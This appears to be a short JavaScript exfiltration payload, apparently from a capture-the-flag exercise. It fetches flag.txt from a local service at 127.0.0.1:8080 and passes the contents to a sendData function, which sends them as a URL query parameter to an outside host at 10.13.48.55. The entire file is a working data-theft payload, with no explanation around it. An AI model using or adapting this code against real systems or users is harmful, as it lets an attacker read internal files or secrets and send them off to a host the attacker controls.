function sendData(data) {
    const url = new URL("http://10.13.48.55");
    url.searchParams.append("data", data);
    fetch(url)
}

fetch("http://127.0.0.1:8080/flag.txt")
    .then(response => response.text())
    .then(data => {
        sendData(data);
    })